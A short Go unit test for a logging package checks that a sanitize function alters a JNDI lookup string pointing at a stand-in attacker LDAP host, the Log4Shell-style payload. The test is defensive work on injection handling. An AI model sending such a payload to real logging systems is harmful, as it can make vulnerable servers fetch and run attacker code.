package logging

import "testing"

func TestLookupPayloadRejected(t *testing.T) {
	msg := "${jndi:ldap://attacker.example.invalid/a}"
	if sanitize(msg) == msg {
		t.Fatal("payload passed through")
	}
}
